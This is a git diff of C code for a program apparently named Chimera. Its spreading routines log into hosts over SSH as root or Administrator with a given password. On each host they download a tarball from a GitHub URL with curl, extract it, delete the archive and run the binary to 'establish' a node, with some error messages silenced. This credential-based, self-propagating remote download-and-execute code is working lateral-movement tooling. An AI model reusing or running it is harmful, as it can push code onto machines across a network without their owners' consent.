@@ -6,6 +6,50 @@ typedef struct ThreadData {
     const char* password;
 } ThreadData;
 
+#if __linux__
+    char* get_lan_ip() {
+        struct ifaddrs *ifaddr, *ifa;
+        int family, s, n;
+        char host[NI_MAXHOST];
+        char *lan_ip = NULL;
+
+        if (getifaddrs(&ifaddr) == -1) {
+            perror("getifaddrs");
+            return NULL;
+        }
+
+        for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
+            if (ifa->ifa_addr == NULL) {
+                continue;
+            }
+
+            family = ifa->ifa_addr->sa_family;
+
+            if (family == AF_INET || family == AF_INET6) {
+                s = getnameinfo(ifa->ifa_addr, (family == AF_INET) ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6),
+                                host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+
+                if (s == 0) {
+                    // Check if IP address is in private IP address range
+                    if ((family == AF_INET && (strncmp(host, "10.", 3) == 0 || strncmp(host, "172.", 4) == 0 || strncmp(host, "192.168.", 8) == 0)) ||
+                        (family == AF_INET6 && (strncmp(host, "fd", 2) == 0))) {
+                        lan_ip = strdup(host);
+                        break;
+                    }
+                } else {
+                    printf("getnameinfo() failed: %s\n", gai_strerror(s));
+                }
+            }
+
+        }
+
+        freeifaddrs(ifaddr);
+        // printf("IP: %s\n", lan_ip);
+
+        return lan_ip;
+    }
+#endif
+
 void* spread_worker(void* data) {
     ThreadData* thread_data = (ThreadData*)data;
     int index = thread_data->index;
@@ -24,8 +68,6 @@ void* spread_worker(void* data) {
         char* username = NULL;
         if (host_os == LINUX) {
             username = "root";
-             printf("%s\n", username);
-            printf("%s\n", host_ip);
             spread_linux(host_ip, username, password);
         } else if (host_os == WINDOWS) {
             username = "Administrator";
@@ -35,6 +77,7 @@ void* spread_worker(void* data) {
             // spread_cisco(host_ip, username, password);
         }
        
+             printf("%s\n", username);
 
     }
     free(data);
@@ -56,10 +99,10 @@ char* remote_execution(const char* host, const char* username, const char* passw
 
     if(remote_os == LINUX) {
         #ifdef _WIN32
-            ret = snprintf(command_string, sizeof(command_string), "echo y | %s -ssh %s -l %s -pw %s \"%s\"",
+            ret = snprintf(command_string, sizeof(command_string), "echo y | %s -ssh %s -l %s -pw %s -o ConnectTimeout=1 \"%s\"",
                 PLINK_EXE_PATH, host, username, password, command);
         #else 
-            ret = snprintf(command_string, sizeof(command_string), "%s -p \"%s\" ssh %s@%s \"%s\"",
+            ret = snprintf(command_string, sizeof(command_string), "%s -p \"%s\" ssh -o ConnectTimeout=1 %s@%s \"%s\"",
                 SSHPASS_PATH, password, username, host, command);
         #endif
         if (ret >= sizeof(command_string)) {
@@ -107,7 +150,7 @@ char* remote_execution(const char* host, const char* username, const char* passw
     // Read the output of the command into the buffer
     size_t bytes_read = fread(output_buffer, 1, MAX_COMMAND_SIZE, fp);
     if (bytes_read == 0) {
-        fprintf(stderr, "Failed to read command output\n");
+        // fprintf(stderr, "Failed to read command output\n");
         free(output_buffer);
         PCLOSE(fp);
         return NULL;
@@ -146,15 +189,16 @@ void spread_linux(const char* host, const char* username, const char* password) 
     // Check if the "Chimera" directory exists on the remote Linux machine
     const char* check_chimera_dir_cmd = "if [ ! -d \"Chimera\" ]; then echo \"NOT_EXIST\"; fi";
     char* output = remote_execution(host, username, password, check_chimera_dir_cmd, LINUX);
-
+    
     if (output != NULL && strcmp(output, "NOT_EXIST\n") == 0) {
         // Download the zip file from the URL
-        const char* url = "https://github.com/M00NLIG7/Chimera/raw/master/packaged.zip";
-        const char* filename = "packaged.zip";
+        // curl -L -o chimera_linux.tar.gz https://github.com/M00NLIG7/Chimera/raw/master/chimera_linux.tar.gz
+        const char* url = "https://github.com/M00NLIG7/Chimera/raw/master/chimera_linux.tar.gz";
+        const char* filename = "chimera_linux.tar.gz";
         char command_string[MAX_COMMAND_SIZE];
         int ret;
 
-        ret = snprintf(command_string, sizeof(command_string), "wget %s",url);
+        ret = snprintf(command_string, sizeof(command_string), "curl -L -o %s %s", filename, url);
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
             return;
@@ -166,8 +210,10 @@ void spread_linux(const char* host, const char* username, const char* password) 
             free(output);
         }
 
+
+        // tar -zxf chimera_linux.tar.gz >/dev/null 2>&1
         // Unzip the file on the remote Linux machine
-        ret = snprintf(command_string, sizeof(command_string), "unzip -o %s > /dev/null", filename);
+        ret = snprintf(command_string, sizeof(command_string), "tar -zxf %s >/dev/null 2>&1", filename);
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
             return;
@@ -178,22 +224,29 @@ void spread_linux(const char* host, const char* username, const char* password) 
             printf("%s\n", output);
             free(output);
         }
-
-        // Run the command on the remote Linux machine
-        ret = snprintf(command_string, sizeof(command_string), "cd Chimera");
-        if (ret >= sizeof(command_string)) {
-            fprintf(stderr, "Command string too long\n");
-            return;
-        }
-
-        output = remote_execution(host, username, password, command_string, LINUX);
-        if (output != NULL) {
-            printf("%s\n", output);
-            free(output);
-        }
+        
 
         // Remove the zip file
         ret = snprintf(command_string, sizeof(command_string), "rm -f %s", filename);
+        if (ret >= sizeof(command_string)) {
+            fprintf(stderr, "Command string too long\n");
+            return;
+        }
+        
+        output = remote_execution(host, username, password, command_string, LINUX);
+
+        if (output != NULL) {
+            free(output);
+        }
+
+        #if __linux__
+        // Run the command on the remote Linux machine
+            ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera --establish-node %s", get_lan_ip());
+        #else
+            // This is nothing but the compiler
+            ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera --establish-node");
+
+        #endif
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
             return;
